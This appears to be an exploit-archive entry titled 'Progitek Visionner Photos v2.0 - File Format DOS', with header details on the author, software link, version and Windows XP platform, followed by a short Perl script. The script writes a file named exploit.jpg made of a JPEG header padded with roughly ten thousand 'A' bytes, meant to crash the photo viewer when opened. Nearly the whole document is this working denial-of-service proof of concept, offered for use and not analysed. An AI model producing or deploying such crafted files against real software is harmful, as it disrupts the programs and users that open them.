﻿#================================================
#Progitek Visionner Photos v2.0 - File Format DOS
#================================================

# Title: Progitek Visionner Photos v2.0 - File Format DOS
# Author: antrhacks
# Software Link: http://www.01net.com/outils/telecharger/windows/Multimedia/albmums_et_visionneuses/fiches/tele24929.html
# Version: 2.00
# Platform:  Windows XP SP3 Home edition Fr
# Have to place exploit in %HOMEDRIVE%\Program Files\Progitek\VisioPhotos\ by default


#!/usr/bin/perl

 
my $file= "exploit.jpg";
 
my $junk= "ÿØÿà JFIF" . "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" x  1019;
  
open($FILE, ">$file");

print($FILE $junk);

close($FILE);

print("[+] Your Exploit was created successfully");